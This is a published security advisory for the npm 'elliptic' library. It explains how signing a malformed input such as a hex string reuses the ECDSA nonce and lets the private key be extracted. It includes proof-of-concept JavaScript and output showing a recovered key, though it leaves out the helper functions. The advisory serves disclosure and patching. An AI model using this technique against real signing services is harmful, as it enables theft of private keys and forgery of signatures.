# [C] Elliptic's private key extraction in ECDSA upon signing a malformed input (e.g. a string)

## Summary
Severity: Critical
Advisory: GHSA-vjh7-7g9h-fjfh
CWE: CWE-200
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:N (CVSS_V4)
Published: 2025-02-12
Source: https://github.com/advisories/GHSA-vjh7-7g9h-fjfh
Type: github-advisory

## Affected
- npm: `elliptic` — affected >=0 <6.6.1

## Details
### Summary

Private key can be extracted from ECDSA signature upon signing a malformed input (e.g. a string or a number), which could e.g. come from JSON network input

Note that `elliptic` by design accepts hex strings as one of the possible input types

### Details

In this code: https://github.com/indutny/elliptic/blob/3e46a48fdd2ef2f89593e5e058d85530578c9761/lib/elliptic/ec/index.js#L100-L107

`msg` is a BN instance after conversion, but `nonce` is an array, and different BN instances could generate equivalent arrays after conversion.

Meaning that a same `nonce` could be generated for different messages used in signing process, leading to `k` reuse, leading to private key extraction from a pair of signatures

Such a message can be constructed for any already known message/signature pair, meaning that the attack needs only a single malicious message being signed for a full key extraction

While signing unverified attacker-controlled messages would be problematic itself (and exploitation of this needs such a scenario), signing a single message still _should not_ leak the private key

Also, message validation could have the same bug (out of scope for this report, but could be possible in some situations), which makes this attack more likely when used in a chain

### PoC

#### `k` reuse example

```js
import elliptic from 'elliptic'

const { ec: EC } = elliptic

const privateKey = crypto.getRandomValues(new Uint8Array(32))
const curve = 'ed25519' // or any other curve, e.g. secp256k1
const ec = new EC(curve)
const prettyprint = ({ r, s }) => `r: ${r}, s: ${s}`
const sig0 = prettyprint(ec.sign(Buffer.alloc(32, 1), privateKey)) // array of ones
const sig1 = prettyprint(ec.sign('01'.repeat(32), privateKey)) // same message in hex form
const sig2 = prettyprint(ec.sign('-' + '01'.repeat(32), privateKey)) // same `r`, different `s`
console.log({ sig0, sig1, sig2 })
```

#### Full attack

This doesn't include code for generation/recovery on a purpose (bit it's rather trivial)

```js
import elliptic from 'elliptic'

const { ec: EC } = elliptic

const privateKey = crypto.getRandomValues(new Uint8Array(32))
const curve = 'secp256k1' // or any other curve, e.g. ed25519
const ec = new EC(curve)

// Any message, e.g. previously known signature
const msg0 = crypto.getRandomValues(new Uint8Array(32))
const sig0 = ec.sign(msg0, privateKey)

// Attack
const msg1 = funny(msg0) // this is a string here, but can also be of other non-Uint8Array types
const sig1 = ec.sign(msg1, privateKey)

const something = extract(msg0, sig0, sig1, curve)

console.log('Curve:', curve)
console.log('Typeof:', typeof msg1)
console.log('Keys equal?', Buffer.from(privateKey).toString('hex') === something)
const rnd = crypto.getRandomValues(new Uint8Array(32))
const st = (x) => JSON.stringify(x)
console.log('Keys equivalent?', st(ec.sign(rnd, something).toDER()) === st(ec.sign(rnd, privateKey).toDER()))
console.log('Orig key:', Buffer.from(privateKey).toString('hex'))
console.log('Restored:', something)
```

Output:
```console
Curve: secp256k1
Typeof: string
Keys equal? true
Keys equivalent? true
Orig key: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a
Restored: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a
```

Similar for `ed25519`, but due to low `n`, the key might not match precisely but is nevertheless equivalent for signing:
```console
Curve: ed25519
Typeof: string
Keys equal? false
Keys equivalent? true
Orig key: f1ce0e4395592f4de24f6423099e022925ad5d2d7039b614aaffdbb194a0d189
Restored: 01ce0e4395592f4de24f6423099e0227ec9cb921e3b7858581ec0d26223966a6
```
`restored` is equal to `orig` mod `N`.

### Impact

Full private key extraction when signing a single malicious message (that passes `JSON.stringify`/`JSON.parse`)

## References
- https://github.com/indutny/elliptic/security/advisories/GHSA-vjh7-7g9h-fjfh
- https://github.com/indutny/elliptic/commit/04cb6f54ce552b3ebde6be06d6050419e1c7333e
- https://github.com/indutny/elliptic
